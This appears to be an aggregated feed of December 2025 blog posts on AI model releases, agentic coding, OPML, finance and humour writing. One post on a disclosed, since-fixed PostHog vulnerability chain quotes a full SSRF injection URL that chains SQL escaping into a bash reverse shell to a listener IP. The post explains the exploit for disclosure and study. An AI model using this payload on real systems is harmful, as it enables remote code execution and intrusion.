Meaning you get to the list via the web, and the web takes off from there because the whole point of the OPML is to give you a collection of web addresses of feeds, that can change. Machine-readable. And it'll be very useful once there's a little more adoption. What large product is so strong that it won't mind if it's easy to move data into their system from outside their walls? Not just data, but pointers to places were over time there will be more data. There's still more power to explore in the web, but the web is made of people, because until people choose to explore, nothing happens.</p>

<blockquote>
<p>Doublespeed, a startup backed by Andreessen Horowitz (a16z) that uses a phone farm to manage at least hundreds of AI-generated social media accounts and promote products has been hacked. The hack reveals what products the AI-generated accounts are promoting, often without the required disclosure that these are advertisements, and allowed the hacker to take control of more than 1,000 smartphones that power the company.</p>
<p>The hacker, who asked for anonymity because he feared retaliation from the company, said he reported the vulnerability to Doublespeed on October 31. At the time of writing, the hacker said he still has access to the company’s backend, including the phone farm itself. ...</p>

      <h1>Introducing GPT-5.2-Codex</h1>

(date: 2025-12-19)
      <p>
      <p><strong><a href="https://openai.com/index/introducing-gpt-5-2-codex/">Introducing GPT-5.2-Codex</a></strong></p>
<p>The latest in OpenAI's <a href="https://simonwillison.net/tags/gpt-codex/">Codex family of models</a> (not the same thing as their Codex CLI or Codex Cloud coding agent tools).</p>
<blockquote>
<p>GPT‑5.2-Codex is a version of <a href="https://openai.com/index/introducing-gpt-5-2/">GPT‑5.2⁠</a> further optimized for agentic coding in Codex, including improvements on long-horizon work through context compaction, stronger performance on large code changes like refactors and migrations, improved performance in Windows environments, and significantly stronger cybersecurity capabilities.</p>
</blockquote>
<p>As with some previous Codex models this one is available via their Codex coding agents now and will be coming to the API &quot;in the coming weeks&quot;. Unlike previous models there's a new invite-only preview process for vetted cybersecurity professionals for &quot;more permissive models&quot;.</p>
<p>I've been very impressed recently with GPT 5.2's ability to <a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/">tackle multi-hour agentic coding challenges</a>. 5.2 Codex scores 64% on the Terminal-Bench 2.0 benchmark that GPT-5.2 scored 62.2% on. I'm not sure how concrete that 1.8% improvement will be!</p>
<p>I didn't hack API access together this time (see <a href="https://simonwillison.net/2025/Nov/9/gpt-5-codex-mini/">previous attempts</a>), instead opting to just ask Codex CLI to &quot;Generate an SVG of a pelican riding a bicycle&quot; while running the new model (effort medium). <a href="https://tools.simonwillison.net/codex-timeline?url=https://gist.githubusercontent.com/simonw/10ad81e82889a97a7d28827e0ea6d768/raw/d749473b37d86d519b4c3fa0892b5e54b5941b38/rollout-2025-12-18T16-09-10-019b33f0-6111-7840-89b0-aedf755a6e10.jsonl#tz=local&amp;q=&amp;type=all&amp;payload=all&amp;role=all&amp;hide=1&amp;truncate=1&amp;sel=3">Here's the transcript</a> in my new Codex CLI timeline viewer, and here's the pelican it drew:</p>
<p><img src="https://static.simonwillison.net/static/2025/5.2-codex-pelican.png" alt="Alt text by GPT-5.2-Codex: A minimalist illustration of a white pelican with a large orange beak riding a teal bicycle across a sandy strip of ground. The pelican leans forward as if pedaling, its wings tucked back and legs reaching toward the pedals. Simple gray motion lines trail behind it, and a pale yellow sun sits in the top‑right against a warm beige sky."></p>

(date: 2025-12-19)
      <p>
      <p><strong><a href="https://agentskills.io/">Agent Skills</a></strong></p>
<p>Anthropic have turned their <a href="https://simonwillison.net/tags/skills/">skills mechanism</a> into an &quot;open standard&quot;, which I guess means it lives in an independent <a href="https://github.com/agentskills/agentskills">agentskills/agentskills</a> GitHub repository now? I wouldn't be surprised to see this end up <a href="https://simonwillison.net/2025/Dec/9/agentic-ai-foundation/">in the AAIF</a>, recently the new home of the MCP specification.</p>
<p>The specification itself lives at <a href="https://agentskills.io/specification">agentskills.io/specification</a>, published from <a href="https://github.com/agentskills/agentskills/blob/main/docs/specification.mdx">docs/specification.mdx</a> in the repo.</p>
<p>It is a deliciously tiny specification - you can read the entire thing in just a few minutes. It's also quite heavily under-specified - for example, there's a <code>metadata</code> field described like this:</p>
<blockquote>
<p>Clients can use this to store additional properties not defined by the Agent Skills spec</p>
<p>We recommend making your key names reasonably unique to avoid accidental conflicts</p>
</blockquote>
<p>And an <code>allowed-skills</code> field:</p>
<blockquote>
<p>Experimental. Support for this field may vary between agent implementations</p>
<p>Example:</p>
<pre><code>allowed-tools: Bash(git:*) Bash(jq:*) Read

</code></pre>
</blockquote>
<p>The Agent Skills homepage promotes adoption by OpenCode, Cursor,Amp, Letta, goose, GitHub, and VS Code. Notably absent is OpenAI, who are <a href="https://simonwillison.net/2025/Dec/12/openai-skills/">quietly tinkering with skills</a> but don't appear to have formally announced their support just yet.</p>
<p><strong>Update 20th December 2025</strong>: OpenAI <a href="https://developers.openai.com/codex/skills/">have added Skills to the Codex documentation</a> and the Codex logo is now <a href="https://agentskills.io/">featured on the Agent Skills homepage</a> (as of <a href="https://github.com/agentskills/agentskills/commit/75287b28fb7a8106d7798de99e13189f7bea5ca0">this commit</a>.)</p>

<p>Note that while this release makes many improvements in the specialisation
optimisation, polymorphic specialisation remains disabled by default in the
release due to concern over regressions of the sort identified in<a href="https://gitlab.haskell.org/ghc/ghc/-/issues/26329">#26329</a>. Users needing more aggressive specialisation can explicitly
enable this feature with the <code>-fpolymorphic-specialisation</code> flag. Depending
upon our experience with 9.14.1, we may enable this feature by default in a
later minor release.</p>

      <p>If you subscribe to this blog, you must like it — right? I mean, you are subscribed to it.</p>
<p>And if you like this blog, you might also like <a href="https://notes.jim-nielsen.com">my notes blog</a>.</p>
<p>It’s where I take short notes of what I read, watch, listen to, or otherwise consume, add my two cents, and fire it off into the void of the internet.</p>
<p>It’s sort of like a “link blog” but I’m not necessarily recommending everything I link to. It’s more of “This excerpt stood out to me in some way, here’s my thoughts on why.”</p>
<p>It’s nice to have a place where I can jot down a few notes, fire off my reaction, and nobody can respond to it lol. At least, not in any easy, friction-less way. You’d have to go out of your way to read my commentary, find my contact info, and fire off a message (critiquing or praising). That’s how I like it. Cuts through the noise.</p>
<p>Anyway, this is all a long way of saying: if you didn’t already know about my notes blog, you might like it. <a href="https://notes.jim-nielsen.com">Check it out</a> or <a href="https://notes.jim-nielsen.com/feed.xml">subscribe</a>.</p>
<p>Today, for example, I posted lots of grumpy commentary.</p>

<h2>What We Enjoyed This Week</h2>

But what we particularly enjoyed was the turn this piece takes around the halfway mark, when it becomes clear that all of these red/green flags are being experienced by the same person, and a delightfully strange version of a Hallmark movie narrative emerges.</p>
<p><a href="https://www.newyorker.com/magazine/2025/12/15/the-show-must-go-on?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>The Show Must Go On</strong></a> <strong>by</strong> <a href="http://www.adrian-tomine.com/?utm_source=humorouswriting&amp;utm_medium=email&amp;utm_campaign=a-newsletter-of-humorous-writing-423"><strong>Adrian Tomine</strong></a> <em>(The New Yorker)</em> This is a fun and funny short autobiographical comic about how your relationship to certain things in the place where you live changes as you get older.

It’s so funny the way the narrator’s tone switches from being disingenuously ingratiating to quietly menacing (and later to being outright threatening):</p>
<p>“Although, you know what… and I just thought of this now, if you can get that subtotal above $75, we’ll just get rid of that shipping cost all together. I mean I’m no mathematician, but that seems like an obvious choice to me! Hahahaha! Here’s some more of our products.</p>

      <h1>Your job is to deliver code you have proven to work</h1>

(date: 2025-12-18)
      <p>
      <p>In all of the debates about the value of AI-assistance in software development there's one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers - or open source maintainers - and expects the &quot;code review&quot; process to handle the rest.</p>
<p>This is rude, a waste of other people's time, and is honestly a dereliction of duty as a software developer.</p>
<p><strong>Your job is to deliver code you have proven to work.</strong></p>
<p>As software engineers we don't just crank out code - in fact these days you could argue that's what the LLMs are for. We need to deliver <em>code that works</em> - and we need to include <em>proof</em> that it works as well. Not doing that directly shifts the burden of the actual work to whoever is expected to review our code.</p>
<h4>How to prove it works</h4>
<p>There are two steps to proving a piece of code works. Neither is optional.</p>
<p>The first is <strong>manual testing</strong>. If you haven't seen the code do the right thing yourself, that code doesn't work. If it does turn out to work, that's honestly just pure chance.</p>
<p>Manual testing skills are genuine skills that you need to develop. You need to be able to get the system into an initial state that demonstrates your change, then exercise the change, then check and demonstrate that it has the desired effect.</p>
<p>If possible I like to reduce these steps to a sequence of terminal commands which I can paste, along with their output, into a comment in the code review. Here's a <a href="https://github.com/simonw/llm-gemini/issues/116#issuecomment-3666551798">recent example</a>.</p>
<p>Some changes are harder to demonstrate. It's still your job to demonstrate them! Record a screen capture video and add that to the PR. Show your reviewers that the change you made actually works.</p>
<p>Once you've tested the happy path where everything works you can start trying the edge cases. Manual testing is a skill, and finding the things that break is the next level of that skill that helps define a senior engineer.</p>
<p>The second step in proving a change works is <strong>automated testing</strong>. This is so much easier now that we have LLM tooling, which means there's no excuse at all for skipping this step.</p>
<p>Your contribution should <a href="https://simonwillison.net/2022/Oct/29/the-perfect-commit/">bundle the change</a> with an automated test that proves the change works. That test should fail if you revert the implementation.</p>
<p>The process for writing a test mirrors that of manual testing: get the system into an initial known state, exercise the change, assert that it worked correctly. Integrating a test harness to productively facilitate this is another key skill worth investing in.</p>
<p>Don't be tempted to skip the manual test because you think the automated test has you covered already! Almost every time I've done this myself I've quickly regretted it.</p>
<h4>Make your coding agent prove it first</h4>
<p>The most important trend in LLMs in 2025 has been the explosive growth of <strong>coding agents</strong> - tools like Claude Code and Codex CLI that can actively execute the code they are working on to check that it works and further iterate on any problems.</p>
<p>To master these tools you need to learn how to get them to <em>prove their changes work</em> as well.</p>
<p>This looks exactly the same as the process I described above: they need to be able to manually test their changes as they work, and they need to be able to build automated tests that guarantee the change will continue to work in the future.</p>
<p>Since they're robots, automated tests and manual tests are effectively the same thing.</p>
<p>They do feel a little different though. When I'm working on CLI tools I'll usually teach Claude Code how to run them itself so it can do one-off tests, even though the eventual automated tests will use a system like <a href="https://click.palletsprojects.com/en/stable/testing/">Click's CLIRunner</a>.</p>
<p>When working on CSS changes I'll often encourage my coding agent to take screenshots when it needs to check if the change it made had the desired effect.</p>
<p>The good news about automated tests is that coding agents need very little encouragement to write them. If your project has tests already most agents will extend that test suite without you even telling them to do so. They'll also reuse patterns from existing tests, so keeping your test code well organized and populated with patterns you like is a great way to help your agent build testing code to your taste.</p>
<p>Developing good taste in testing code is another of those skills that differentiates a senior engineer.</p>
<h4>The human provides the accountability</h4>
<p><a href="https://simonwillison.net/2025/Feb/3/a-computer-can-never-be-held-accountable/">A computer can never be held accountable</a>. That's your job as the human in the loop.</p>
<p>Almost anyone can prompt an LLM to generate a thousand-line patch and submit it for code review. That's no longer valuable. What's valuable is contributing <em>code that is proven to work</em>.</p>
<p>Next time you submit a PR, make sure you've included your evidence that it works as it should.</p>

      <h1>Pluralistic: A perfect distillation of the social uselessness of finance (18 Dec 2025)</h1>

(date: 2025-12-18)
      <p>
      <p>Today's links A perfect distillation of the social uselessness of finance: A final thought for the yule. Hey look at this: Delights to delectate. Object permanence: Droidflake; Spy Skymall; Malthus is a dope; Happy Public Domain Day 2025. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. A perfect distillation of the social uselessness of finance (permalink) I'm about to sign off for the year – actually, I was ready to do it yesterday, but then I happened upon a brief piece of writing that was so perfect that I decided I'd do one more edition of Pluralistic for 2025. The piece in question is John Lanchester's &quot;For Every Winner A Loser,&quot; in the London Review of Books, in which Lanchester reviews two books about the finance sector: Gary Stevenson's The Trading Game and Rob Copeland's The Fund: <a href="https://www.lrb.co.uk/the-paper/v46/n17/john-lanchester/for-every-winner-a-loser">https://www.lrb.co.uk/the-paper/v46/n17/john-lanchester/for-every-winner-a-loser</a> It's a long and fascinating piece and it's certainly left me wanting to read both books, but that's not what convinced me to do one more newsletter before going on break – rather, it was a brief passage in the essay's preamble, a passage that perfectly captures the total social uselessness of the finance sector as a whole. Lanchester starts by stating that while we think of the role of the finance sector as &quot;capital allocation&quot; – that is, using investors' money to fund new businesses and expansions for existing business – that hasn't been important to finance for quite some time. Today, only 3% of bank activity consists of &quot;lending to firms and individuals engaged in the production of goods and services.&quot; The other 97% of finance is gambling. Here's how Stevenson breaks it down: say your farm grows mangoes. You need money before the mangoes are harvested, so you sell the future ownership of the harvest to a broker at <span class="math inline">\(1/crate. The broker immediately flips that interest in your harvest to a dealer who believes (on the basis of a rumor about bad weather) that mangoes will be scarce this year and is willing to pay \)</span>1.10/crate. Next, an international speculator (trading on the same rumor) buys the rights from the broker at <span class="math inline">\(1.20/crate. Now come the side bets: a "momentum trader" (who specializing in bets on market trends continuing) buys the rights to your crop for \)</span>1.30/crate. A contrarian trader (who bets against momentum traders) short-sells the momentum trader's bet at <span class="math inline">\(1.20. More short sellers pile in and drive the price down to \)</span>1/crate. Now, a new rumor circulates, about conditions being ripe for a bounteous mango harvest, so more short-sellers appear, and push the price to <span class="math inline">\(0.90/crate. This tempts the original broker back in, and he buys your crop back at \)</span>1/crate. That's when the harvest comes. You bring in the mangoes. They go to market, and fetch <span class="math inline">\(1.10/crate. This is finance – a welter of transactions, only one of which (selling your mangoes to people who eat them) involves the real economy. Everything else is "speculation on the movement of prices." The nine transactions that took place between your planting the crop and someone eating the mangoes are all zero sum – every trade has an evenly matched winner and loser, and when you sum them all up, they come out to zero. In other words, no value was created. This is the finance sector. In a world where the real economy generates \)</span>105 trillion/year, the financial derivatives market adds up to $667 trillion/year. This is &quot;the biggest business in the world&quot; – and it's useless. It produces nothing. It adds no value. If you work a job where you do something useful, you are on the losing side of this economy. All the real money is in this socially useless, no-value-creating, hypertrophied, metastasized finance sector. Every gain in finance is matched by a loss. It all amounts to – literally – nothing. So that's what tempted me into one more blog post for the year – an absolutely perfect distillation of the uselessness of &quot;the biggest business in the world,&quot; whose masters are the degenerate gamblers who buy and sell our politicians, set our policy, and control our lives. They're the ones enshittifying the internet, burning down the planet, and pushing Elon Musk towards trillionairedom. It's their world, and we just live on it. For now.

<p>Apple gave me access to this Mac Studio cluster to test RDMA over Thunderbolt, a <a href="https://developer.apple.com/documentation/macos-release-notes/macos-26_2-release-notes#RDMA-over-Thunderbolt">new feature in macOS 26.2</a>. The easiest way to test it is with <a href="https://exolabs.net">Exo 1.0</a>, an open source private AI clustering tool. RDMA lets the Macs all act like they have one giant pool of RAM, which speeds up things like massive AI models.</p>

      <h1>Inoreader and dynamic OPML</h1>

(date: 2025-12-18)
      <p>
      <p><em>This post was updated thanks to <a href="https://github.com/scripting/Scripting-News/issues/348#issuecomment-3672110696">help</a> from Andrew Shell.</em></p>
<p>I have a free account at <a href="https://www.inoreader.com/">Inoreader</a>. I was reminded today that they support dynamic OPML subscription lists, and decided to give it a try.</p>
<p>You can <a href="https://www.inoreader.com/opml_subscriptions">subscribe</a> to an OPML subscription list. Exactly the same format we used for importing lists. This means I can use the same feed list in two readers. Or I could share my list with everyone who subscribes to my newsletter. I can update the list, and the flow of news to the subscribers changes too.</p>
<p>I tried subscribing to my <a href="https://feedland.social/opml?screenname=davewiner&amp;catname=podcasts">podcast list</a> in Inoreader.</p>
<ol>
<li>Put the URL to my podcast list on the clipboard.</li>
<li>Go to <a href="https://www.inoreader.com/opml_subscriptions">this page</a> on the Inoreader site.</li>
<li>Click the big blue Subscribe to OPML button.</li>
<li>Paste the URL from the first step into the dialog.</li>
<li>Enter a folder name and description.</li>
<li>For synchronization I recommend the second option, full synchronization.</li>
<li>Then click Save, and if it worked, you should see the OPML file in a list.</li>
</ol>
<p>It <a href="https://imgs.scripting.com/2025/12/18/inoreaderList.png">worked</a>. I now can see my podcast updates in Inoreader, exactly as if it was in FeedLand.</p>
<p>And when I add new feeds they show up over there, same when I remove.</p>
<p>It'll be very interesting to see how it changes over time. I'll let you know! ;-)</p>
<p><strong>Links</strong></p>
<ul>
<li><a href="https://this.how/podcasting/">Listening lists</a>, as a feature for podcasts.</li>
<li>This is <a href="https://lists.opml.org/">where</a> I was accumulating short URLs for subscription lists. Started it in Sept. The <a href="https://lists.opml.org/daveblogroll.xml">short URL</a> for the blogroll.</li>

      <h1>Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain</h1>

(date: 2025-12-18)
      <p>
      <p><strong><a href="https://mdisec.com/inside-posthog-how-ssrf-a-clickhouse-sql-escaping-0day-and-default-postgresql-credentials-formed-an-rce-chain-zdi-25-099-zdi-25-097-zdi-25-096/">Inside PostHog: How SSRF, a ClickHouse SQL Escaping 0day, and Default PostgreSQL Credentials Formed an RCE Chain</a></strong></p>
<p>Mehmet Ince describes a very elegant chain of attacks against the PostHog analytics platform, combining several different vulnerabilities (now all reported and fixed) to achieve RCE - Remote Code Execution - against an internal PostgreSQL server.</p>
<p>The way in abuses a webhooks system with non-robust URL validation, setting up a SSRF (Server-Side Request Forgery) attack where the server makes a request against an internal network resource.</p>
<p>Here's the URL that gets injected:</p>
<p><code>http://clickhouse:8123/?query=SELECT++FROM+postgresql('db:5432','posthog',\&quot;posthog_use'))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\&quot;bash+-i+&gt;%26+/dev/tcp/172.31.221.180/4444+0&gt;%261\\&quot;$$;SELECT++FROM+cmd_exec;+--\&quot;,'posthog','posthog')#</code></p>
<p>Reformatted a little for readability:</p>
<pre><code>http://clickhouse:8123/?query=
SELECT *
FROM postgresql(
    'db:5432',
    'posthog',
    &quot;posthog_use')) TO STDOUT;
    END;
    DROP TABLE IF EXISTS cmd_exec;
    CREATE TABLE cmd_exec (
        cmd_output text
    );
    COPY cmd_exec
    FROM PROGRAM $$
        bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.31.221.180/4444 0&gt;&amp;1\&quot;
    $$;
    SELECT * FROM cmd_exec;
    --&quot;,
    'posthog',
    'posthog'
)
#

</code></pre>
<p>This abuses ClickHouse's ability to <a href="https://clickhouse.com/docs/sql-reference/table-functions/postgresql#implementation-details">run its own queries against PostgreSQL</a> using the <code>postgresql()</code> table function, combined with an escaping bug in ClickHouse PostgreSQL function ( <a href="https://github.com/ClickHouse/ClickHouse/pull/74144">since fixed</a>). Then <em>that</em> query abuses PostgreSQL's ability to run shell commands via <code>COPY ... FROM PROGRAM</code>.</p>
<p>The <code>bash -c</code> bit is particularly nasty - it opens a reverse shell such that an attacker with a machine at that IP address listening on port 4444 will receive a connection from the PostgreSQL server that can then be used to execute arbitrary commands.</p>

      <h1>The new ChatGPT Images is here</h1>

(date: 2025-12-17)
      <p>
      <p><strong><a href="https://openai.com/index/new-chatgpt-images-is-here/">The new ChatGPT Images is here</a></strong></p>
<p>OpenAI shipped an update to their ChatGPT Images feature - the feature that <a href="https://simonwillison.net/2025/May/13/launching-chatgpt-images/">gained them 100 million new users</a> in a week when they first launched it back in March, but has since been eclipsed by Google's Nano Banana and then further by Nana Banana Pro <a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/">in November</a>.</p>
<p>The focus for the new ChatGPT Images is speed and instruction following:</p>
<blockquote>
<p>It makes precise edits while keeping details intact, and generates images up to 4x faster</p>
</blockquote>
<p>It's also a little cheaper: OpenAI say that the new <a href="https://platform.openai.com/docs/models/gpt-image-1.5">gpt-image-1.5</a> API model makes image input and output &quot;20% cheaper in GPT Image 1.5 as compared to GPT Image 1&quot;.</p>
<p>I tried a new test prompt against a photo I took of Natalie's ceramic stand at the farmers market a few weeks ago:</p>
<blockquote>
<p>Add two kakapos inspecting the pots</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-q80-half.jpg" alt=""></p>
</blockquote>
<p>Here's the result from the new ChatGPT Images model:</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-chatgpt-q80-half.jpg" alt=""></p>
<p>And here's what I got from Nano Banana Pro:</p>
<p><img src="https://static.simonwillison.net/static/2025/pots-nano-banana-q80-half.jpg" alt=""></p>
<p>The ChatGPT Kākāpō are a little chonkier, which I think counts as a win.</p>
<p>I was a little less impressed by the result I got for an infographic from the prompt &quot;Infographic explaining how the Datasette open source project works&quot; followed by &quot;Run some extensive searches and gather a bunch of relevant information and then try again&quot; ( <a href="https://chatgpt.com/share/6941f249-cbd0-8006-b9ff-5a19167206bc">transcript</a>):</p>
<p><img src="https://static.simonwillison.net/static/2025/chatgpt-infographic.jpg" alt=""></p>
<p>See <a href="https://simonwillison.net/2025/Nov/20/nano-banana-pro/#creating-an-infographic">my Nano Banana Pro post</a> for comparison.</p>
<p>Both models are clearly now usable for text-heavy graphics though, which makes them far more useful than previous generations of this technology.</p>

      <h1>AoAH Day 15: Porting a complete HTML5 parser and browser test suite</h1>

(date: 2025-12-17)
      <p>
      <p><strong><a href="https://anil.recoil.org/notes/aoah-2025-15">AoAH Day 15: Porting a complete HTML5 parser and browser test suite</a></strong></p>
<p>Anil Madhavapeddy is running an <a href="https://anil.recoil.org/notes/aoah-2025">Advent of Agentic Humps</a> this year, building a new useful OCaml library every day for most of December.</p>
<p>Inspired by Emil Stenström's <a href="https://simonwillison.net/2025/Dec/14/justhtml/">JustHTML</a> and my own coding agent <a href="https://simonwillison.net/2025/Dec/15/porting-justhtml/">port of that to JavaScript</a> he coined the term <strong>vibespiling</strong> for AI-powered porting and transpiling of code from one language to another and had a go at building an HTML5 parser in OCaml, resulting in <a href="https://tangled.org/anil.recoil.org/ocaml-html5rw">html5rw</a> which passes the same <a href="https://github.com/html5lib/html5lib-tests">html5lib-tests</a> suite that Emil and myself used for our projects.</p>
<p>Anil's thoughts on the copyright and ethical aspects of this are worth quoting in full:</p>
<blockquote>
<p>The question of copyright and licensing is difficult. I definitely did <em>some</em> editing by hand, and a fair bit of prompting that resulted in targeted code edits, but the vast amount of architectural logic came from JustHTML. So I opted to make the <a href="https://tangled.org/anil.recoil.org/ocaml-html5rw/blob/main/LICENSE.md">LICENSE a joint one</a> with <a href="https://friendlybit.com">Emil Stenström</a>. I did not follow the transitive dependency through to the Rust one, which I probably should.</p>
<p>I'm also extremely uncertain about every releasing this library to the central opam repository, especially as there are <a href="https://github.com/aantron/lambdasoup">excellent HTML5 parsers</a> already available. I haven't checked if those pass the HTML5 test suite, because this is wandering into the agents <em>vs</em> humans territory that I ruled out in my <a href="https://anil.recoil.org/notes/aoah-2025#groundrules-for-the-advent-of-agentic-humps">groundrules</a>. Whether or not this agentic code is better or not is a moot point if releasing it drives away the human maintainers who are the source of creativity in the code!</p>

      <h1>Gemini 3 Flash</h1>

(date: 2025-12-17)
      <p>
      <p>It continues to be a busy December, if not quite as busy <a href="https://simonwillison.net/2024/Dec/20/december-in-llms-has-been-a-lot/">as last year</a>. Today's big news is <a href="https://blog.google/technology/developers/build-with-gemini-3-flash/">Gemini 3 Flash</a>, the latest in Google's &quot;Flash&quot; line of faster and less expensive models.</p>
<p>Google are emphasizing the comparison between the new Flash and their previous generation's top model Gemini 2.5 Pro:</p>
<blockquote>
<p>Building on 3 Pro’s strong multimodal, coding and agentic features, 3 Flash offers powerful performance at less than a quarter the cost of 3 Pro, along with higher rate limits. The new 3 Flash model surpasses 2.5 Pro across many benchmarks while delivering faster speeds.</p>
</blockquote>
<p>Gemini 3 Flash's characteristics are almost identical to Gemini 3 Pro: it accepts text, image, video, audio, and PDF, outputs only text, handles 1,048,576 maximum input tokens and up to 65,536 output tokens, and has the same knowledge cut-off date of January 2025 (also shared with the Gemini 2.5 series).</p>
<p>The benchmarks look good. The cost is appealing: 1/4 the price of Gemini 3 Pro ≤200k and 1/8 the price of Gemini 3 Pro &gt;200k, and it's nice not to have a price increase for the new Flash at larger token lengths.</p>
<p>It's a little <em>more</em> expensive than previous Flash models - Gemini 2.5 Flash was <span class="math inline">\(0.30/million input tokens and \)</span>2.50/million on output, Gemini 3 Flash is <span class="math inline">\(0.50/million and \)</span>3/million respectively.</p>
<p>Google <a href="https://blog.google/products/gemini/gemini-3-flash/">claim</a> it may still end up cheaper though, due to more efficient output token usage:</p>
<blockquote>
<p>&gt; Gemini 3 Flash is able to modulate how much it thinks. It may think longer for more complex use cases, but it also uses 30% fewer tokens on average than 2.5 Pro.</p>
</blockquote>
<p>Here's <a href="https://www.llm-prices.com/#it=100000&amp;ot=10000&amp;sel=gemini-3-flash-preview%2Cgemini-3-pro-preview%2Cgemini-3-pro-preview-200k%2Cgpt-5.2%2Cclaude-opus-4-5%2Cclaude-sonnet-4.5%2Cclaude-4.5-haiku%2Cgemini-2.5-flash%2Cgpt-5-mini">a more extensive price comparison</a> on my <a href="https://www.llm-prices.com/">llm-prices.com</a> site.</p>
<h4>Generating some SVGs of pelicans</h4>
<p>I released <a href="https://github.com/simonw/llm-gemini/releases/tag/0.28">llm-gemini 0.28</a> this morning with support for the new model. You can try it out like this:</p>
<pre><code>llm install -U llm-gemini
llm keys set gemini # paste in key
llm -m gemini-3-flash-preview &quot;Generate an SVG of a pelican riding a bicycle&quot;

</code></pre>
<p>According to <a href="https://ai.google.dev/gemini-api/docs/gemini-3#thinking_level">the developer docs</a> the new model supports four different thinking level options: <code>minimal</code>, <code>low</code>, <code>medium</code>, and <code>high</code>. This is different from Gemini 3 Pro, which only supported <code>low</code> and <code>high</code>.</p>
<p>You can run those like this:</p>
<pre><code>llm -m gemini-3-flash-preview --thinking-level minimal &quot;Generate an SVG of a pelican riding a bicycle&quot;

</code></pre>
<p>Here are four pelicans, for thinking levels <a href="https://gist.github.com/simonw/8047c805a4a1df7fd4e854b18e7482d9">minimal</a>, <a href="https://gist.github.com/simonw/fb61686a1f915e3777b4a40e2df41068">low</a>, <a href="https://gist.github.com/simonw/190c3ce82cd8976827139bbc4dcc2d19">medium</a>, and <a href="https://gist.github.com/simonw/da66ffce135359161996e41e50e32ec3">high</a>:</p>

<h4>I built the gallery component with Gemini 3 Flash</h4>
<p>The gallery above uses a new Web Component which I built using Gemini 3 Flash to try out its coding abilities. The code on the page looks like this:</p>
<pre><code>&lt;image-gallery width=&quot;4&quot;&gt;
    &lt;img src=&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-minimal-pelican-svg.jpg&quot; alt=&quot;A minimalist vector illustration of a stylized white bird with a long orange beak and a red cap riding a dark blue bicycle on a single grey ground line against a plain white background.&quot; /&gt;
    &lt;img src=&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-low-pelican-svg.jpg&quot; alt=&quot;Minimalist illustration: A stylized white bird with a large, wedge-shaped orange beak and a single black dot for an eye rides a red bicycle with black wheels and a yellow pedal against a solid light blue background.&quot; /&gt;
    &lt;img src=&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-medium-pelican-svg.jpg&quot; alt=&quot;A minimalist illustration of a stylized white bird with a large yellow beak riding a red road bicycle in a racing position on a light blue background.&quot; /&gt;
    &lt;img src=&quot;https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg&quot; alt=&quot;Minimalist line-art illustration of a stylized white bird with a large orange beak riding a simple black bicycle with one orange pedal, centered against a light blue circular background.&quot; /&gt;
&lt;/image-gallery&gt;
</code></pre>
<p>Those alt attributes are all generated by Gemini 3 Flash as well, using this recipe:</p>
<pre><code>llm -m gemini-3-flash-preview --system '
You write alt text for any image pasted in by the user. Alt text is always presented in a
fenced code block to make it easy to copy and paste out. It is always presented on a single
line so it can be used easily in Markdown images. All text on the image (for screenshots etc)
must be exactly included. A short note describing the nature of the image itself should go first.' \
-a https://static.simonwillison.net/static/2025/gemini-3-flash-preview-thinking-level-high-pelican-svg.jpg
</code></pre>
<p>You can see the code that powers the image gallery Web Component <a href="https://github.com/simonw/simonwillisonblog/blob/31651b3a527011d1c971d4256c1c9f61ef378d23/static/image-gallery.js">here on GitHub</a>. I built it by prompting Gemini 3 Flash via <a href="https://llm.datasette.io/">LLM</a> like this:</p>
<pre><code>llm -m gemini-3-flash-preview '
Build a Web Component that implements a simple image gallery. Usage is like this:

&lt;image-gallery width=&quot;5&quot;&gt;
  &lt;img src=&quot;image1.jpg&quot; alt=&quot;Image 1&quot;&gt;
  &lt;img src=&quot;image2.jpg&quot; alt=&quot;Image 2&quot; data-thumb=&quot;image2-thumb.jpg&quot;&gt;
  &lt;img src=&quot;image3.jpg&quot; alt=&quot;Image 3&quot;&gt;
&lt;/image-gallery&gt;

If an image has a data-thumb= attribute that one is used instead, other images are scaled down.

The image gallery always takes up 100% of available width. The width=&quot;5&quot; attribute means that five images will be shown next to each other in each row. The default is 3. There are gaps between the images. When an image is clicked it opens a modal dialog with the full size image.

Return a complete HTML file with both the implementation of the Web Component several example uses of it. Use https://picsum.photos/300/200 URLs for those example images.'
</code></pre>
<p>It took a few follow-up prompts using <code>llm -c</code>:</p>
<pre><code>llm -c 'Use a real modal such that keyboard shortcuts and accessibility features work without extra JS'

llm -c 'Use X for the close icon and make it a bit more subtle'

llm -c 'remove the hover effect entirely'

llm -c 'I want no border on the close icon even when it is focused'
</code></pre>
<p>Here's <a href="https://gist.github.com/simonw/09f63a49f29620d4cbbfd383cfee1db3">the full transcript</a>, exported using <code>llm logs -cue</code>.</p>
<p>Those five prompts took:</p>
<ul>
<li>225 input, 3,269 output</li>
<li>2,243 input, 2,908 output</li>
<li>4,319 input, 2,516 output</li>
<li>6,376 input, 2,094 output</li>
<li>8,151 input, 1,806 output</li>
</ul>
<p>Added together that's 21,314 input and 12,593 output for a grand total <a href="https://www.llm-prices.com/#it=21314&amp;ot=12593&amp;sel=gemini-3-flash-preview">of 4.8436 cents</a>.</p>
<p>The guide to <a href="https://ai.google.dev/gemini-api/docs/gemini-3#migrating_from_gemini_25">migrating from Gemini 2.5</a> reveals one disappointment:</p>
<blockquote>
